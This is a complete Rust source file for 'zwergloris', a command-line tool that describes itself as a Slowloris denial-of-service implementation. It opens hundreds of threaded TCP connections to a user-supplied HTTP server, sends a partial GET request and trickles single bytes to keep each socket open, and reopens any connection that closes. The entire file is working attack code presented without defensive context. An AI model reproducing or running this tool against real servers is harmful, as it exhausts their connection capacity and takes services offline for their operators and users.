use std::io::Write;
use std::net::TcpStream;
use std::sync::mpsc;
use std::sync::mpsc::Sender;
use std::{thread, time};
use clap::{App, Arg};

static NTHREADS_DEFAULT: &str = "500";
static SLEEPTIME_DEFAULT_S :&str = "10";

fn main() {

    let matches = App::new("zwergloris")
        .version("0.1.0")
        .author("tufteddeer <tufteddeer@disroot.org")
        .about("Slowloris DoS implementation")
        .arg(Arg::with_name("target")
            .short("t")
            .long("target")
            .value_name("IP:PORT")
            .help("Target HTTP server")
            .takes_value(true)
            .required(true))
        .arg(Arg::with_name("count")
            .short("c")
            .long("count")
            .value_name("COUNT")
            .help("Number of connections"))
        .arg(Arg::with_name("sleep")
            .short("s")
            .long("sleep")
            .value_name("SLEEP")
            .help("Number of seconds to wait between data is send"))
        .get_matches();


    let target = matches.value_of("target").unwrap();

    let num_connections = matches.value_of("count").unwrap_or(NTHREADS_DEFAULT);
    let num_connections = num_connections.parse::<u32>().expect("Failed to parse connection count");

    let sleep = matches.value_of("sleep").unwrap_or(SLEEPTIME_DEFAULT_S);
    let sleep = sleep.parse::<u64>().expect("failed to parse sleep time to number0");
    let sleep = time::Duration::from_secs(sleep);

    let msg = "GET /foo HTTP/1.0\r\n".as_bytes();

    let (tx, rx) = mpsc::channel();

    println!("Attacking http://{} with {} connections", target, num_connections);
    println!("Sending more data every {}s", sleep.as_secs());

    for _ in 0..num_connections {
        new_connection(&msg, tx.clone(), &String::from(target), sleep);
    }

    // when a thread reports that a connection is closed, create a new one
    while rx.recv().is_ok() {
        new_connection(&msg, tx.clone(), &String::from(target), sleep);
    }

    println!("Terminated.");
}

fn new_connection(msg: &'static [u8], sender: Sender<&'static str>, host : &String, sleep : time::Duration) {
    let host = host.clone();

    thread::spawn(move || {
        let mut stream = TcpStream::connect(host).expect("failed to connect");

        stream.write_all(&msg).expect("error writing stream");

        let buff = [0 as u8;1];
        while stream.write(&buff).is_ok() {
            thread::sleep(sleep);
        }
        sender.send("closed").unwrap();
    });
}
